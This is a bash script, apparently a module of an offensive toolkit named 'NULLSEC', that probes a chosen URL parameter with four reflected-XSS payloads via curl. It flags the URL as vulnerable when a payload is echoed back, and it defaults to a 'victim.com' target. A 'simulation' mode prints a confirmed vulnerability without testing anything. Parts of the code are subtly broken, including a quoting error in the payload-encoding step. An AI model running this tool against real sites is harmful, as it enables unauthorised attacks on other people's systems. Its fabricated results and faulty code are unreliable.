#!/bin/bash
# NULLSEC XSS Attack - FULLY FUNCTIONAL

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC XSS ATTACK ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Target URL: '${RESET})" TARGET
[ -z "$TARGET" ] && TARGET="http://victim.com/search"
read -p "$(echo -e ${WHITE}'  [>] Parameter: '${RESET})" PARAM
[ -z "$PARAM" ] && PARAM="q"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing XSS attack"
    echo -e "${DIM}[*] Testing XSS payloads...${RESET}"
    sleep 0.5
    echo -e "${GREEN}[+]${RESET} Payload: <script>alert('XSS')</script>"
    sleep 0.3
    echo -e "${GREEN}[+]${RESET} Vulnerable! XSS confirmed"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live XSS exploitation"
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}[!] curl not installed${RESET}"
        exit 1
    fi
    
    PAYLOADS=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "'><script>alert(1)</script>"
    )
    
    echo -e "${CYAN}[*] Testing XSS payloads...${RESET}"
    for payload in "${PAYLOADS[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
        url="${TARGET}?${PARAM}=${encoded}"
        echo -e "${DIM}[*] ${payload}${RESET}"
        
        response=$(curl -s "$url")
        if echo "$response" | grep -q "$payload"; then
            echo -e "${GREEN}[+] VULNERABLE!${RESET}"
            echo -e "${GREEN}[+] URL: $url${RESET}"
        fi
    done
    echo -e "${GREEN}[✓]${RESET} Complete"
fi
echo ""
